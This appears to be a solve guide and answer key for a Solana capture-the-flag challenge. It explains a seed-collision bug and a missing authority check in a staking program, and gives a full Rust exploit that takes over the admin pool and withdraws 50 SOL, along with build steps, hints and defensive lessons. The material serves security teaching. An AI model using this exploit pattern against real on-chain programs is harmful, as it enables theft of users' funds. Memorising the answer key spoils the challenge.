# Player Solve Flow

## Phase 1: Analysis (30-60 minutes)

Player receives source code and examines it:

1. **Read lib.rs**
   - See 3 instructions: Initialize, Stake, Withdraw
   - Notice PDA derivation uses organization + employee_id
   - See helper function `get_pool_pda()` shows the seed structure

2. **Read processor.rs**
   - Understand Initialize creates a pool PDA
   - Understand Stake transfers SOL to pool
   - Understand Withdraw transfers SOL from pool to user
   - Notice Withdraw checks `pool.is_admin` but doesn't validate authority

3. **Read entrypoint.rs**
   - Standard Solana entry point, nothing special

## Phase 2: Vulnerability Discovery (15-30 minutes)

Player realizes the key issue:

**PDA Seed Collision**
- Admin pool uses seeds: `["POOL", "H7Corp", "admin"]`
- What if organization = "H7Cor" and employee_id = "padmin"?
- Seeds would be: `["POOL", "H7Cor", "padmin"]`
- Concatenated: `POOL` + `H7Cor` + `padmin` = same bytes as `POOL` + `H7Corp` + `admin`
- **Same PDA address!**

This allows:
1. Create a pool with different credentials
2. Access the SAME PDA as admin pool
3. Mark YOUR pool as admin (is_admin = true)
4. Withdraw from the admin's balance

## Phase 3: Exploit Development (30-45 minutes)

Player writes a Solana program (`exploit/src/lib.rs`):

```rust
use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    pubkey::Pubkey,
    program::invoke,
    system_instruction,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let target_program = accounts[0].key;  // Staking program
    let pool_pda = accounts[1].clone();
    let attacker = accounts[2].clone();
    let system_program = accounts[3].clone();
    
    // 1. Initialize with colliding seeds
    let init_ix = staking_pool::initialize(
        *target_program,
        *pool_pda.key,
        *attacker.key,
        "H7Cor".to_string(),    // Collides!
        "padmin".to_string(),   // Collides!
    );
    invoke(&init_ix, &[pool_pda.clone(), attacker.clone(), system_program.clone()])?;
    
    // 2. Withdraw from admin's balance
    let withdraw_ix = staking_pool::withdraw(
        *target_program,
        *pool_pda.key,
        *attacker.key,
        50_000_000_000,  // 50 SOL
    );
    invoke(&withdraw_ix, &[pool_pda.clone(), attacker.clone()])?;
    
    Ok(())
}
```

## Phase 4: Compilation (5 minutes)

```bash
cd exploit
cargo build-sbf
```

Output: `target/deploy/exploit.so`

## Phase 5: Submission (5 minutes)

Connect to challenge server:
```bash
nc <instance> 5001
```

Server interaction:
1. Shows user account (10 SOL)
2. Shows program ID
3. Shows admin pool (100 SOL)
4. Asks for exploit file size
5. Receives binary upload
6. Deploys exploit program
7. Executes exploit
8. Checks if attacker stole ≥50 SOL
9. Returns flag if successful

## Key Learning Points

1. **PDA Seed Collisions**: Concatenated seeds can create unexpected collisions
2. **Access Control**: Always validate authority, not just state flags
3. **Seed Design**: Use fixed-length fields or separators between variable-length seeds
4. **Solana Security**: Understanding how PDAs are derived and validated

## Total Expected Solve Time

- Beginner Solana player: 2-3 hours
- Experienced Solana player: 45-90 minutes
- Expert: 30-45 minutes

## Hints (if needed)

- **Hint 1**: "Look at how the pool PDA is derived from the seeds"
- **Hint 2**: "What happens if organization and employee_id concatenate to the same bytes?"
- **Hint 3**: "Can you create a different org+employee that produces the same PDA?"
